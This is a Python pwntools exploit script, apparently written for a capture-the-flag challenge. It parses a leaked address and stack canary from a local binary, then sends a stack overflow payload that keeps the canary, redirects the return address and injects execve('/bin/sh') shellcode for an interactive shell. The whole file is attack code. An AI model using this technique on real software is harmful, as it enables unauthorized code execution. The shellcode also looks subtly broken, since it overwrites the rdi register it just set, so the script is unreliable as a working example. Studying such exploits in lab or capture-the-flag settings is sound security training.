from pwn import * 

binary = "./program"

context.log_level = 'debug'
context.arch = "amd64"
#r = remote("chal.firebird.sh", 35026)
r = process(binary)
r.recvuntil(b"0x")
UwU_addr = int(b'0x' + r.recvuntil(b' ', drop = True), 16)

r.recvuntil(b"0x")
canary = int(b'0x' + r.recvuntil(b' ', drop = True), 16)


log.info('UwU address: ' + hex(UwU_addr))
log.info('canary: ' + hex(canary))

shellcode = asm("""
mov rax, 0x68732f6e69622f
push rax
                
mov rdi, rsp
mov rsi, 0
mov rdi, 0
                
mov rax, 0x3b
syscall
""")

payload = flat(
    b'A' * 0x18,
    p64(canary),
    b'B' * 0x8,
    p64(UwU_addr + 0x18 + 8 + 8 + 8),
    shellcode
)

r.recvuntil(b"you pass!")
r.sendline(payload)
r.interactive()